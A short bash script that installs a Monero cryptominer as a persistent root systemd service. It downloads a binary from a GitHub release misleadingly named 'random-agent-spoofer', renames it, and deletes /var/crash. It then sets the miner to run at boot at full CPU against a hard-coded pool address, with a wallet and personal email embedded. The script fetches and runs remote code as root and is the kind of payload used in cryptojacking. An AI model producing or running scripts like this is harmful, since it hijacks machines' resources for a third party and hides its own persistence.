#!/bin/bash
cd /home
sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
sudo cp ar jvdar 
sudo chmod +x jvdar

sudo rm -rf /lib/systemd/system/xmrthanh.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar --coin=XMR --url=20.92.22.146:2237 --user=45nNtymtZbxfiJUXvyiG2575p5KuwMYF1GimnrDizug9AGWqKwKMsycgfEXrcAGX4xG7hZQaXwPhLTBTCwpb9QZ9752uwvD.vm/tuyen1321995@gmail.com --cpu-max-threads-hint=100 --tls
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
